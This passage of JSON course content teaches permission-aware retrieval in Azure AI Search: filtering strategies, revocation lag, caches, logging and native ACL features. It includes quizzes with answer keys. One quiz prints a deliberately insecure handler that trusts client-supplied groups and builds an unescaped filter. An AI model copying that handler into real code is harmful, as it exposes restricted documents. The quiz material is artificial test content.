index.","avoidWhen":"Revocation must take effect in seconds, or deny rules and links cannot be flattened.","meta":[{"k":"Recall","v":"measure it"},{"k":"Freshness","v":"sync lag"}]},{"name":"Pre-filter plus live check on top hits","summary":"Filter in the index, then ask the source of truth about the few hits that survive.","pros":["Closes the sync-lag window for the hits that matter","The source evaluates deny rules and links exactly"],"cons":["Adds latency and load on the source for every query","Needs a source API that answers per document and fails closed"],"bestWhen":"Restricted tiers, revocation in seconds, or rules richer than an index field can hold.","avoidWhen":"Broad internal content where hours of lag are acceptable.","meta":[{"k":"Latency","v":"one parallel call per checked hit"},{"k":"Freshness","v":"live for checked hits"}]},{"name":"Delegate retrieval to the source","tag":"Preview","summary":"Let the system of record retrieve with the caller's token and do not copy the content. Examples: the Microsoft 365 Copilot Retrieval API, or a remote SharePoint knowledge source in Azure AI Search.","pros":["Permissions honoured at query time with nothing to sync","No copy to leak or purge"],"cons":["Little control over ranking, chunking or filters","Retrieval API: 200 requests per user per hour, 25 results, unordered, license or pay-as-you-go (preview) needed"],"bestWhen":"The content already lives in Microsoft 365 and revocation must be near immediate.","avoidWhen":"You need custom ranking, many sources or high per-user query rates.","meta":[{"k":"Freshness","v":"live"},{"k":"Control","v":"low"}]},{"name":"Index or service per tenant","summary":"A physical wall: one index per tenant, or a separate service for the largest tenants.","pros":["Strongest isolation","Per-tenant delete, export and embedding model","No tenant filter to forget"],"cons":["Index caps per tier (Basic 15, S1 50, S2 and S3 200)","Cost and operations grow with tenants","Does nothing for group access inside a tenant"],"bestWhen":"Few large or regulated tenants whose access is only the tenant id.","avoidWhen":"Thousands of small tenants, or per-document ACLs inside each tenant.","meta":[{"k":"Isolation","v":"physical"},{"k":"Cost","v":"high per tenant"}]},{"name":"Index per user","summary":"Every user gets a private slice of the index.","pros":["Perfect isolation for that user","No filter needed"],"cons":["Copies every shared document per reader","Rebuilds on every permission change","Hits index caps after a few principals"],"bestWhen":"Very few principals and highly personal data, such as a personal notes assistant.","avoidWhen":"Shared documents, or any scale.","meta":[{"k":"Scale","v":"a handful of principals"},{"k":"Cost","v":"very high"}]}]},{"t":"h","text":"Flip the dials","level":2,"id":"flip-the-dials"},{"t":"dials","id":"w07-l3-wall","title":"Where should the wall stand?","prompt":"Set how selective access is, how rich the rules are, how fast revocation must be and where the content lives. Watch the winner change and read why.","dials":[{"id":"sel","label":"Share of the corpus a caller can see","values":[{"id":"most","label":"Most of it"},{"id":"few","label":"A few percent"},{"id":"tiny","label":"A tiny slice (per-document ACLs)"}]},{"id":"model","label":"Permission model","values":[{"id":"tag","label":"Tenant id or flat tag"},{"id":"group","label":"Nested groups, per-document ACLs"},{"id":"rich","label":"Rich rules: deny, links, guests"}]},{"id":"revoke","label":"Revocation must take effect in","values":[{"id":"hours","label":"Hours"},{"id":"minutes","label":"Minutes"},{"id":"seconds","label":"Seconds"}]},{"id":"where","label":"Where the content lives","values":[{"id":"copied","label":"Copied into your index"},{"id":"system","label":"In a system with permission-honouring retrieval"}]}],"options":[{"id":"post","name":"Post-filter in your code","summary":"Retrieve, then drop what the caller cannot see."},{"id":"pre","name":"Pre-filter in the index","summary":"The predicate runs inside the search."},{"id":"prelive","name":"Pre-filter plus live check","summary":"Index filter, then the source verifies the top hits."},{"id":"delegate","name":"Delegate to the source","summary":"The system of record retrieves with the caller's token."},{"id":"wall","name":"Physical wall per tenant or user","summary":"Separate indexes or services."}],"scores":{"post":{"sel":{"most":{"s":2,"why":"Nearly every hit survives, so the top k stays full."},"few":{"s":-1,"why":"Hidden hits eat the top k, so you must over-fetch."},"tiny":{"s":-2,"why":"Most queries return one result or none unless you fetch thousands."}},"model":{"tag":{"s":0,"why":"Works, though a filter is cheaper."},"group":{"s":0,"why":"Needs resolved groups in your code and an ACL lookup per hit."},"rich":{"s":1,"why":"Code can evaluate any rule: deny, links, guests."}},"revoke":{"hours":{"s":0,"why":"Fine, but not the reason to choose it."},"minutes":{"s":1,"why":"Can read a live ACL cache at check time."},"seconds":{"s":1,"why":"Can consult a live source, but denied text has already reached your code."}},"where":{"copied":{"s":0,"why":"Neutral."},"system":{"s":0,"why":"Neutral."}}},"pre":{"sel":{"most":{"s":1,"why":"Works, though the filter adds little when almost everything is visible."},"few":{"s":2,"why":"Only allowed documents compete, so the top k stays full."},"tiny":{"s":0,"why":"Recall under a very selective filter can degrade. Measure it."}},"model":{"tag":{"s":2,"why":"One filterable field does the job."},"group":{"s":2,"why":"Group ids in a filter, resolved from the token or Graph."},"rich":{"s":-1,"why":"Allow-lists only. Deny entries and links must be flattened before indexing."}},"revoke":{"hours":{"s":2,"why":"Sync lag is acceptable."},"minutes":{"s":0,"why":"Bounded by your sync path. A pull indexer cannot beat 5 minutes."},"seconds":{"s":-2,"why":"An index copy lags the source."}},"where":{"copied":{"s":2,"why":"The ACL fields sit beside the chunks they guard."},"system":{"s":-1,"why":"Copying the content creates a sync problem you could avoid."}}},"prelive":{"sel":{"most":{"s":0,"why":"Live checks add latency for little gain."},"few":{"s":1,"why":"Filter first, then verify the few survivors."},"tiny":{"s":1,"why":"Few survivors keep the live check cheap."}},"model":{"tag":{"s":0,"why":"A tenant id needs no live check."},"group":{"s":1,"why":"Catches membership changes the index has not seen."},"rich":{"s":2,"why":"The source evaluates deny rules, links and guests exactly."}},"revoke":{"hours":{"s":-1,"why":"Pays latency for freshness nobody asked for."},"minutes":{"s":1,"why":"Closes most of the lag window."},"seconds":{"s":2,"why":"The source of truth answers for every returned hit."}},"where":{"copied":{"s":1,"why":"Verifies the copy against its origin."},"system":{"s":0,"why":"Reasonable, but delegation may be simpler."}}},"delegate":{"sel":{"most":{"s":0,"why":"Neutral."},"few":{"s":1,"why":"The source ranks only what the caller can see."},"tiny":{"s":1,"why":"Same, with no filtered ANN to tune."}},"model":{"tag":{"s":-1,"why":"Overkill for a flat tag."},"group":{"s":1,"why":"The source resolves groups itself."},"rich":{"s":2,"why":"The source applies its own full rules."}},"revoke":{"hours":{"s":0,"why":"Overkill for this speed."},"minutes":{"s":1,"why":"No copy to go stale."},"seconds":{"s":2,"why":"Permissions are read at query time."}},"where":{"copied":{"s":-2,"why":"Nothing to delegate to once the content is copied elsewhere."},"system":{"s":2,"why":"The system of record answers with the caller's token."}}},"wall":{"sel":{"most":{"s":0,"why":"Neutral."},"few":{"s":1,"why":"Isolation makes selectivity a non-issue inside a tenant."},"tiny":{"s":1,"why":"A per-user slice is perfectly selective, at a high price."}},"model":{"tag":{"s":2,"why":"A tenant id maps to one index."},"group":{"s":-2,"why":"Group access inside a tenant still needs a filter."},"rich":{"s":-2,"why":"Walls cannot express deny rules or links."}},"revoke":{"hours":{"s":0,"why":"Neutral."},"minutes":{"s":0,"why":"Neutral."},"seconds":{"s":1,"why":"Cutting a tenant off is an access change with no per-document sync."}},"where":{"copied":{"s":1,"why":"The content is already copied, so splitting it is a layout choice."},"system":{"s":-1,"why":"Duplicates content per tenant instead of querying the source."}}}},"takeaway":"Post-filtering wins only when almost everything is visible. Pre-filtering is the default for copied content with group ACLs. Add a live check for seconds-level revocation, delegate when the source can retrieve, and build walls only when the permission model is a tenant id."},{"t":"failure","title":"Failure modes to recognise","items":[{"symptom":"Users with narrow access get two or three results when ten were expected.","cause":"A post-filter over a selective permission model: eight of ten hits were removed after retrieval.","fix":"Move the predicate into the query, or over-fetch with a cap (k_needed divided by the visible fraction) and alert on result count per query."},{"symptom":"A revoked user still sees a document for hours.","cause":"The ACL in the index lags the source, and no live check or cache TTL covers the gap.","fix":"Set a revocation SLA per tier, push ACL merges on change events, live-check the top hits for restricted content and test with a revoked canary user."},{"symptom":"Filtered vector queries return few or poor results although matching documents exist.","cause":"ANN recall degrades under a highly selective filter.","fix":"Measure recall at production selectivity against a brute-force baseline, raise candidate counts and consider exhaustive search for small partitions."},{"symptom":"A result comes back unfiltered on one path only.","cause":"The filter is missing from one code path, such as an agent tool call, or the index has no permission metadata so the header does nothing.","fix":"Put one API gatekeeper in front of every store, apply the filter on every retrieval including those inside agent loops and add a canary test per path."},{"symptom":"Denied text shows up in a rerank request or a log although the final answer was clean.","cause":"Post-filtering lets denied text reach later stages before it is dropped.","fix":"Filter before reranking and logging, or log identifiers only."}]},{"t":"accordion","items":[{"title":"Go deeper: tenancy walls compared","blocks":[{"t":"table","head":["Wall","How it isolates","Wins when","Loses when"],"rows":[["Service per tenant","A separate search service","Few large or regulated tenants, hardest separation","Cost and operations per tenant, poor fit for many small tenants [[r22]]"],["Index per tenant","A separate index in one service","Hundreds of tenants. S3 HD allows 1,000 indexes per partition and 3,000 per service [[r20]]","Per-tier caps: Basic 15, S1 50, S2 and S3 200"],["Shared index with a tenant filter","A mandatory tenant field on every chunk and query","Thousands of small tenants","One missed filter leaks across tenants, so it needs the API gatekeeper"],["Namespace per tenant (Pinecone)","Every read and write targets one namespace, and offboarding deletes it","Many tenants on a vector store with namespaces, 100 (Starter) to 1,000,000 (Enterprise) per serverless index","Vendor specific, and the query-cost argument is the vendor's own claim [[r34]]"],["Partition key per tenant (Cosmos DB)","Tenant id as the partition key. Hierarchical keys lift the 20 GB logical partition limit","Documents already in Cosmos DB","A partition key is a data layout choice, not an authorization control [[r33]]"],["Row-level security (Azure SQL, PostgreSQL)","A database predicate on every query, with the user passed through SESSION_CONTEXT","Content in a relational store and the app sets the user per request","Owners and BYPASSRLS roles bypass unless forced, and a shared login hides the user [[r31]] [[r32]]"]],"caption":"Azure's mixed model is documented: big tenants on dedicated services, small tenants on shared indexes [[r21]]."}]},{"title":"Go deeper: the security filter pattern and its limits","blocks":[{"t":"code","lang":"text","title":"Security filter on a Collection(Edm.String) field","code":"group_ids/any(g: search.in(g, 'g1, g2, g3'))","caption":"The field is filterable and retrievable: false."},{"t":"p","md":"`search.in` equals a chain of `eq ... or` but is faster. The docs describe sub-second responses with hundreds or thousands of values and no explicit item cap, limited by request size (16 MB payload, 8 KB URL for GET), and latency grows with the value count [[r14]]. The pattern is a string match with no authentication, so your code must derive the principal from a validated token. `retrievable: false` hides the field from results but is not field-level security [[r13]]."}]}]},{"t":"callout","kind":"interview","title":"What interviewers listen for","md":"For each option, say which stage sees denied text and what flips the choice. A strong answer ends with the combination: pre-filter for the bulk, a live check for restricted tiers, a gatekeeper in front of every store and a canary test for every path."}],"quiz":[{"id":"w07-l3-q1","type":"single","tag":"flip","q":"Content sits in SharePoint with deny-style rules and sharing links, and revocation must take effect in seconds. Which option moves to the top?","options":["Post-filter in your code against the indexed ACL copy of the permissions","Pre-filter in the index with flattened group ids from nightly syncs","Live-check the top hits at the source","An index per user rebuilt whenever a permission changes"],"answer":2,"explain":"Only the source of truth evaluates deny rules and links exactly and is current within seconds. A post-filter over an indexed copy and a flattened pre-filter both inherit sync lag and cannot express deny entries. An index per user multiplies copies and still lags the source.","difficulty":2,"ref":"r26"},{"id":"w07-l3-q2","type":"single","tag":"bug","q":"What is the most serious flaw in this handler?","code":{"lang":"python","code":"def search(request):\n    groups = request.json[\"groups\"]\n    flt = \"group_ids/any(g: search.in(g, '\" + \",\".join(groups) + \"'))\"\n    return index.search(request.json[\"q\"], filter=flt)"},"options":["The client supplies its own groups","`search.in` is slower than a chain of `eq` clauses for long lists","The ACL field should be marked retrievable so it can be filtered","The filter should run after the search instead of before it"],"answer":0,"explain":"The principal comes from the request body, so the filter enforces whatever the client claims. Groups must be derived from a validated token or Graph, and quotes in values need escaping. `search.in` is the faster form, retrievable is not needed for filtering, and moving the filter after the search would make it a post-filter.","difficulty":2,"ref":"r13"},{"id":"w07-l3-q3","type":"single","tag":"diagnose","q":"After launch the median user gets one result instead of ten. Telemetry for the median user is shown. What is the cause?","code":{"lang":"text","code":"k_needed = 10   fetched = 30   removed_by_acl = 29\nvisible_fraction = 5%"},"options":["Embedding model drift after the last re-index","A reranker timeout under heavy load","A recall floor in the pre-filter","Post-filter with 3x over-fetch at 5% visible"],"answer":3,"explain":"Fetching 30 candidates at 5% visibility leaves about 1.5 visible documents, which matches 29 of 30 removed. The fix is a pre-filter, or an over-fetch near 10 divided by 0.05, which is 200. Drift and timeouts do not show up as ACL removals, and a pre-filter would not report removals at all.","difficulty":2,"ref":"r22"},{"id":"w07-l3-q4","type":"single","tag":"tradeoff","q":"A product serves 40 enterprise tenants. A few are 100 times larger than the rest, each contract requires deletion within days, and access inside a tenant is only membership of the tenant. Which wall fits?","options":["Index per tenant, big ones on own services","Shared index with a mandatory tenant filter and delete-by-query offboarding","An index per user with tenants as folders","A post-filter in your code with tenant ids in metadata"],"answer":0,"explain":"Forty tenants fit well inside per-tier index caps, dropping an index satisfies deletion, and skewed sizes match the documented mixed model of dedicated services for large tenants. A shared index makes deletion a delete-by-query and bets on one filter never being missed. An index per user has no tenant meaning, and a post-filter isolates nothing.","difficulty":2,"ref":"r21"}],"defend":null,"refs":["r13","r14","r20","r21","r22","r26","r31","r32","r33","r34"],"takeaways":["Ask which stage sees denied text. Post-filters expose the most stages, pre-filters the fewest.","Post-filtering needs a visible fraction near 1. Over-fetch is k_needed divided by that fraction.","Pre-filter for copied content with group ACLs, add a live check for seconds-level revocation.","Delegate to the source when it can retrieve with the caller's token, and walls fit only tenant-id permission models.","One gatekeeper in front of every store, and a canary test per code path."]},{"id":"w07-l4","order":4,"title":"Break the filters","kind":"lab","minutes":25,"brief":"Numbers beat opinions. Starve a post-filter, squeeze a pre-filter's recall, leak a revoked grant, then look for the copies of your data that live outside the ACL: caches and logs.","blocks":[{"t":"h","text":"Run the simulator","level":2,"id":"run-the-simulator"},{"t":"lab","id":"acl-simulator","intro":"Teaching simplification, not a benchmark. Relevance is assumed independent of permission, so candidates are exchangeable and a post-filter sees visible documents in proportion to the visible fraction. Start with the three presets (broad access, group based, per document), then run the three guided experiments under the results: starve the post-filter, squeeze the pre-filter's recall, and compare sync lag with a live check."},{"t":"formula","title":"Over-fetch for a post-filter","expr":"k_fetch = ceil(k_needed / f)","vars":[{"k":"k_needed","v":"results you want after filtering"},{"k":"f","v":"visible fraction, the share of the corpus the caller may see"}],"example":"At f = 2% and k_needed = 10, fetch **500** candidates. In the simulator's group-based preset (f = 5%, k = 10, 3x over-fetch) the post-filter returns a median of 1 result and about 22% of queries are empty. Source: the lab model, a hypergeometric draw."},{"t":"formula","title":"Chance a grant is stale inside the sync window","expr":"P(stale) = 1 - exp(-lambda x lag)","vars":[{"k":"lambda","v":"revocations per grant per hour, the daily revocation rate divided by 24"},{"k":"lag","v":"hours between the change at the source and the index"}],"example":"At 5% revocations a day and 24 hours of lag, P(stale) is about **4.9%** per returned grant. With 10 hits per query, 1 - (1 - 0.049)^10 is about **39%** of queries that include a revoked document. Source: the lab model."},{"t":"h","text":"Copies outside the ACL","level":2,"id":"copies-outside-the-acl"},{"t":"compare","title":"Cache options for permissioned content","intro":"Every cache is a second copy of the answer. Its key and its TTL decide who can read it and for how long after a revocation.","options":[{"name":"No cache","summary":"Generate every answer from a fresh, filtered retrieval.","pros":["No cross-user path","Always as current as retrieval"],"cons":["Full generation cost and latency every time"],"bestWhen":"ACL scope is nearly unique per user, or the content is in a restricted tier.","avoidWhen":"Heavy repeat traffic over broad, shared access.","meta":[{"k":"Leak risk","v":"none"},{"k":"Cost","v":"high"}]},{"name":"Exact-match response cache keyed by ACL scope","summary":"Key on the normalized question plus the caller's scope (user or group set).","pros":["Cheap and predictable","No similarity mistakes"],"cons":["Hit rate falls as the scope key gets finer","TTL must stay below the revocation SLA","Needs purge on document or ACL change"],"bestWhen":"Repeated questions inside large groups with identical visibility.","avoidWhen":"The key is the question alone, which hands any user any cached answer.","meta":[{"k":"Leak risk","v":"low if scoped"},{"k":"Hit rate","v":"medium"}]},{"name":"Semantic cache with `vary-by`","summary":"Match similar questions, but only inside a partition. Azure API Management partitions with `vary-by`, for example on user or group id.","pros":["Highest hit rate on paraphrases"],"cons":["The docs warn it can return incorrect, outdated or unsafe answers","`score-threshold`: start near 0.05, above 0.2 may mismatch","Should be skipped when any source document is restricted (design reasoning)"],"bestWhen":"FAQ-like traffic over broad shared content.","avoidWhen":"Restricted content, or scope that is nearly unique per user, where it is cost with little benefit.","meta":[{"k":"Leak risk","v":"medium"},{"k":"Hit rate","v":"high"}]},{"name":"Provider prompt cache only","summary":"Rely on the provider's prefix cache and add nothing of your own.","pros":["Scoped by the provider: per organization (OpenAI), per subscription (Azure OpenAI, [[r30]]), per workspace on several Anthropic surfaces","Only identical prefixes hit"],"cons":["Saves cost and latency only on repeated prefixes","`prompt_cache_key` is for routing and accounting, not a security control","An ICML 2025 audit found timing side channels where caches were shared across users in seven providers. Provider docs state scoped caches as of 2026-10-13, so read the paper as the reason to prefer scope [[r29]]"],"bestWhen":"A safe baseline for every tenant.","avoidWhen":"You need answer-level reuse.","meta":[{"k":"Leak risk","v":"low"},{"k":"Scope","v":"org, subscription or workspace"}]}]},{"t":"table","caption":"Logging policy. Logs copy ACL-protected content into a store that has no ACLs.","head":["Policy","Keeps","Debugging power","Risk"],"rows":[["Ids and decisions only","Document ids, principal id, filter hash, outcome","Reproduce which documents and which filter, not the text","Lowest. Matches the advice for access logs of grounding data and immutable retrieval logs [[r22]] [[r2]]"],["Content with redaction","Snippets after PII redaction","Good for quality review","Redaction misses things, and the log store needs its own access control"],["Full content, strict access","Prompts, chunks and answers for a bounded window","Best for incident analysis","Protected text lives outside the ACL. Set retention and deletion rules"],["No content, metrics only","Counts and latencies","Weak","Blind during an incident"]],"highlightCol":0},{"t":"failure","title":"Failure modes to recognise","items":[{"symptom":"A revoked user keeps the same answer for 25 minutes after the index ACL changed in 2 minutes.","cause":"A response or semantic cache entry whose TTL is longer than the revocation SLA, or whose key ignores ACL scope.","fix":"Key by ACL scope, keep TTL below the SLA and purge on document and ACL change events."},{"symptom":"A user gets an answer built from a document they cannot open.","cause":"A semantic cache shared across users that matched on similarity with a loose threshold.","fix":"Partition with `vary-by`, tighten `score-threshold` (the docs suggest starting near 0.05) and skip the cache for restricted labels [[r28]]."},{"symptom":"Support staff can read confidential snippets in the trace viewer.","cause":"Full content logged to a store with broader access than the source system.","fix":"Log ids and decisions. Capture content only for a bounded window with its own access control. Stateful features such as the Responses API and stored completions also hold prompts at rest in your Foundry resource, so include them in retention and deletion rules [[r38]]."},{"symptom":"Deleted documents still appear in answers.","cause":"Tombstones never reached the index, the semantic cache or a stored answer.","fix":"Propagate deletes to every copy and verify with a canary document that you delete on purpose."}]}],"quiz":[{"id":"w07-l4-q1","type":"numeric","tag":"numeric","q":"A caller can see 2% of the corpus and you need 10 results after a post-filter. About how many candidates must you fetch?","answer":500,"tolerancePct":5,"unit":"candidates","hint":"k_fetch = k_needed / f","explain":"10 divided by 0.02 is 500. Fetching fewer returns fewer than 10 results for most callers, and fetching 500 costs latency and sends 490 denied documents through your code, rerankers and logs. That is why selective access points to a pre-filter.","difficulty":1,"ref":"r22"},{"id":"w07-l4-q2","type":"numeric","tag":"numeric","q":"Revocations run at 2% of grants a day and the sync lag is 12 hours. A query returns 10 hits. About what percent of such queries include at least one revoked document?","answer":9.5,"tolerancePct":5,"unit":"%","hint":"P(stale) = 1 - exp(-lambda x lag), then 1 - (1 - P)^10","explain":"lambda is 0.02 / 24 per hour, so lambda times 12 hours is 0.01 and P(stale) is about 0.995% per grant. Over 10 hits, 1 - (1 - 0.00995)^10 is about 9.5%. A small per-grant rate still leaks in roughly 1 query in 10, which is why a live check on the top hits is worth its latency for restricted tiers.","difficulty":3},{"id":"w07-l4-q3","type":"multi","tag":"security","q":"Select every cache design that keeps ACL-protected answers from crossing between users.","options":["An exact-match response cache keyed by the normalized question only","A semantic cache partitioned with `vary-by` on the group set, with a TTL below the revocation SLA","The provider's prompt cache, which matches identical prefixes inside one organization or subscription","A semantic cache shared by all tenants with `score-threshold` 0.3"],"answers":[1,2],"explain":"Partitioning by group set with a short TTL keeps answers inside one visibility scope. Provider prefix caches are scoped per organization or subscription and only hit on identical prefixes. A question-only key serves one user's answer to another, and a shared semantic cache with a loose threshold can match unrelated questions across tenants.","difficulty":2,"ref":"r28"},{"id":"w07-l4-q4","type":"single","tag":"diagnose","q":"A user was removed from a group at 10:00. The index ACL updated by 10:02, yet the user saw the same restricted answer until 10:28. Which cause fits the log?","code":{"lang":"text","code":"response_cache: key=sha256(question) created=09:58:12 ttl=1800s\nindex_acl_update: doc-77 groups -= [finance] at 10:02:03"},"options":["The indexer interval is set to 30 minutes, so the ACL change arrived late","The access token still carries the old groups claim until it refreshes","A 30 minute response cache keyed by question","The reranker cached its scores for the old result set"],"answer":2,"explain":"The cache entry was created at 09:58 with a 1,800 second TTL, which expires at 10:28, and its key ignores who asked. The index ACL changed at 10:02, so the indexer was not the delay. A stale token claim would affect who is resolved, not replay a stored answer, and a reranker cache would not return finished answer text.","difficulty":2,"ref":"r28"}],"defend":null,"refs":["r2","r22","r28","r29","r30","r38"],"takeaways":["Selective access starves a post-filter: fetch about k_needed divided by the visible fraction, or filter inside the query.","A pre-filter keeps results full but filtered ANN recall drops. Measure it at your real selectivity.","Even a 2% daily revocation rate leaks in roughly 1 query in 10 at 12 hours of lag. Live-check restricted tiers.","Caches and logs are copies. Key caches by ACL scope, keep TTLs below the revocation SLA and log ids, not content.","Provider prompt caches are scoped per organization, subscription or workspace. Use `prompt_cache_key` for routing, not security."]},{"id":"w07-l5","order":5,"title":"Four native paths in Azure AI Search","kind":"problem","minutes":25,"brief":"Azure AI Search offers four document-level approaches, and three are preview as of 2026-10-13. Choose by where the content lives, how fast permissions must propagate and whether preview is allowed, then label every choice honestly.","blocks":[{"t":"h","text":"Four approaches, one GA","level":2,"id":"four-approaches-one-ga"},{"t":"p","md":"The four approaches are security filters, POSIX-like ACL and RBAC scopes, Microsoft Purview sensitivity labels and SharePoint in Microsoft 365 ACLs. Only security filters are GA and work on any API version. The other three need a preview REST API or preview SDK, carry no SLA and are not recommended for production workloads by the docs [[r11]].\n\nA native ACL query passes two checks. The **calling app** needs Search Index Data Reader (or Contributor) through its Authorization header, and the **user's identity** arrives in `x-ms-query-source-authorization`. The service builds the filter itself and a document passes if **any one** of `userIds`, `groupIds` or `rbacScope` matches. Groups, including nested ones, resolve through Microsoft Graph at query time, and if Graph fails the service returns 5xx, never a partial result [[r12]]."},{"t":"compare","title":"The four document-level approaches","intro":"Statuses were checked on 2026-10-13. Freshness always equals the sync path you build.","options":[{"name":"Security filters","tag":"GA","summary":"A filterable `Collection(Edm.String)` field plus a filter your code builds with `search.in`.","pros":["Any API version or SDK","Works with any identity system","You control group resolution"],"cons":["A string match with no authentication","You write and secure group resolution","ACL updates are yours (`merge` or `mergeOrUpload`)"],"bestWhen":"A custom push index, non-Entra identities, or GA is mandatory.","avoidWhen":"You do not want to own nested-group logic and preview is acceptable.","meta":[{"k":"Status","v":"GA"},{"k":"Identity","v":"you resolve it"}]},{"name":"POSIX-like ACL and RBAC scopes","tag":"Preview","summary":"Permission fields `userIds`, `groupIds` and `rbacScope`, enforced at query time from the user's token.","pros":["Graph expands nested groups","Fails closed","ADLS Gen2 and Blob indexers read the permissions, push API covers other sources"],"cons":["No SLA","Allow lists only, no deny entries","At most 1,000 values per field, one field per type, five rbacScope values","ADLS Gen2 allows 32 ACL entries per file"],"bestWhen":"Content in ADLS Gen2 or Blob, or any source whose ACLs you can resolve to Entra object ids, and preview is accepted.","avoidWhen":"GA only, non-Entra identities, or seconds-level revocation.","meta":[{"k":"Status","v":"Preview"},{"k":"Groups","v":"Graph at query time"}]},{"name":"Purview sensitivity labels","tag":"Preview","summary":"Labels extracted from Blob, ADLS Gen2, SharePoint and OneLake gate access by classification.","pros":["Policy follows the label","Works beside ACLs"],"cons":["System-assigned managed identity only","Single tenant, RBAC auth, REST and SDK only","No Autocomplete or Suggest","Chunked indexes need the label on every chunk row"],"bestWhen":"Classification, not named principals, decides access and labels already exist.","avoidWhen":"Per-person ACLs, multitenant setups, or you need Suggest.","meta":[{"k":"Status","v":"Preview"},{"k":"Scope","v":"single tenant"}]},{"name":"SharePoint ACLs","tag":"Preview","summary":"The SharePoint indexer ingests permissions with the content.","pros":["Inheritance, unique item ACLs, Entra groups","From 2026-05-01-preview: list items, ASPX pages, site groups (`spg:`)"],"cons":["No Anyone or People in your organization links, no guests","An Entra group nested in a SharePoint group is not expanded","Parent scope changes need a resync","Application permissions and Basic tier or higher"],"bestWhen":"SharePoint is the source and preview is accepted.","avoidWhen":"Sharing links or guests drive access, or revocation must beat an indexer run.","meta":[{"k":"Status","v":"Preview"},{"k":"Freshness","v":"per run plus resync"}]}]},{"t":"table","caption":"API versions that matter, checked 2026-10-13 [[r18]].","head":["Version","Status","What it adds or changes"],"rows":[["`2026-04-01`","Stable (GA)","Latest stable data plane. Knowledge sources (Blob, OneLake, search index, web) are GA, but `ingestionPermissionOptions` stays preview."],["`2026-08-01-preview`","Preview, latest","The version the current ACL docs target."],["`2026-05-01-preview`","Preview","SharePoint list items, ASPX pages, site groups (`spg:`) and per-run sync of unique item ACLs. Elevated read needs this version or later."],["`2025-11-01-preview`","Preview","ACL filters apply even with an API key or admin role. A missing user token returns only public (`all`) documents."],["`2025-05-01-preview`, `2025-08-01-preview`","Preview","Returned all documents for an API key or admin role with no user token. Re-test if you validated here."]],"highlightCol":1},{"t":"tabs","tabs":[{"label":"Security filter (GA)","blocks":[{"t":"code","lang":"json","title":"Index field","code":"{ \"name\": \"group_ids\", \"type\": \"Collection(Edm.String)\", \"filterable\": true, \"retrievable\": false }"},{"t":"code","lang":"json","title":"Query body, group ids resolved by your code","code":"{ \"search\": \"travel policy\",\n  \"filter\": \"group_ids/any(g: search.in(g, 'g-sales, g-all-staff'))\" }"},{"t":"p","md":"Nothing authenticates the string. Your code derives the ids from a validated token [[r13]]."}]},{"label":"Native ACL (preview)","blocks":[{"t":"code","lang":"json","title":"Index schema","code":"{ \"permissionFilterOption\": \"enabled\",\n  \"fields\": [\n    { \"name\": \"DocumentId\", \"type\": \"Edm.String\", \"key\": true },\n    { \"name\": \"UserIds\", \"type\": \"Collection(Edm.String)\", \"permissionFilter\": \"userIds\", \"filterable\": true },\n    { \"name\": \"GroupIds\", \"type\": \"Collection(Edm.String)\", \"permissionFilter\": \"groupIds\", \"filterable\": true },\n    { \"name\": \"RbacScope\", \"type\": \"Edm.String\", \"permissionFilter\": \"rbacScope\", \"filterable\": true }\n  ] }"},{"t":"code","lang":"http","title":"Query with the user's token","code":"POST {endpoint}/indexes/{index}/docs/search?api-version=2026-08-01-preview\nAuthorization: Bearer {app-token}\nx-ms-query-source-authorization: {user-token}\nContent-Type: application/json\n\n{ \"search\": \"travel policy\", \"select\": \"name,GroupIds\" }"},{"t":"p","md":"Store Entra object ids (GUIDs), not UPNs. The special values are `all` (public) and `none`. Without the user token only public documents return [[r15]]."}]},{"label":"Elevated read (debug)","blocks":[{"t":"code","lang":"http","title":"Search POST only","code":"POST {endpoint}/indexes('{index}')/search.post.search?api-version=2026-08-01-preview\nAuthorization: Bearer {admin-token}\nx-ms-query-source-authorization: {user-token}\nx-ms-enable-elevated-read: true"},{"t":"p","md":"Needs Search Index Data Contributor or a custom role with `Microsoft.Search/searchServices/indexes/contentSecurity/elevatedOperations/read`. It does not work on knowledge base retrieve [[r12]]."}]}]},{"t":"h","text":"Pick the native path by source","level":2,"id":"pick-the-native-path-by-source"},{"t":"dials","id":"w07-l5-native","title":"Which Azure path fits?","prompt":"Set where the content lives, the status you can accept, the revocation target and what decides access.","dials":[{"id":"source","label":"Where the content lives","values":[{"id":"custom","label":"Database or custom app, pushed"},{"id":"lake","label":"ADLS Gen2 or Blob"},{"id":"spo","label":"SharePoint in Microsoft 365"}]},{"id":"status","label":"Status you can accept","values":[{"id":"ga","label":"GA only, SLA needed"},{"id":"prev","label":"Preview is fine"}]},{"id":"revoke","label":"Revocation target","values":[{"id":"hours","label":"Hours"},{"id":"minutes","label":"Minutes"},{"id":"seconds","label":"Seconds"}]},{"id":"rule","label":"What decides access","values":[{"id":"principals","label":"Named users and groups"},{"id":"label","label":"Sensitivity labels"}]}],"options":[{"id":"secfilter","name":"Security filters on a push index","summary":"GA string filter, you resolve groups."},{"id":"nativeacl","name":"Native ACL and RBAC scopes","summary":"Preview fields enforced from the user token."},{"id":"spo","name":"SharePoint indexer with ACLs","summary":"Preview indexer that ingests SharePoint permissions."},{"id":"purview","name":"Purview sensitivity labels","summary":"Preview label-based gating."},{"id":"remote","name":"Delegate to the source","summary":"Remote SharePoint knowledge source or Copilot Retrieval API."}],"scores":{"secfilter":{"source":{"custom":{"s":2,"why":"Any source works, and you own the ACL field."},"lake":{"s":1,"why":"Works, but you build ACL extraction."},"spo":{"s":0,"why":"You would write SharePoint ACL extraction."}},"status":{"ga":{"s":2,"why":"GA on any API version."},"prev":{"s":0,"why":"Nothing extra to gain from preview."}},"revoke":{"hours":{"s":1,"why":"A scheduled push is enough."},"minutes":{"s":1,"why":"Merge the ACL field on change events."},"seconds":{"s":0,"why":"Needs your own change feed and short caches."}},"rule":{"principals":{"s":1,"why":"A string match on ids you resolve."},"label":{"s":-2,"why":"No label semantics in a string field."}}},"nativeacl":{"source":{"custom":{"s":1,"why":"The push API accepts the permission fields."},"lake":{"s":2,"why":"ADLS Gen2 and Blob indexers read ACLs and RBAC scopes."},"spo":{"s":-1,"why":"Use the SharePoint indexer instead."}},"status":{"ga":{"s":-2,"why":"Preview: no SLA, not advised for production."},"prev":{"s":2,"why":"The intended home of this feature."}},"revoke":{"hours":{"s":1,"why":"An indexer run is enough."},"minutes":{"s":0,"why":"Indexer floor is 5 minutes, and ADLS needs a resync."},"seconds":{"s":-1,"why":"The document ACL copy lags even though groups resolve live."}},"rule":{"principals":{"s":2,"why":"Built for user, group and role ids."},"label":{"s":-1,"why":"Labels are a separate feature."}}},"spo":{"source":{"custom":{"s":-2,"why":"Not 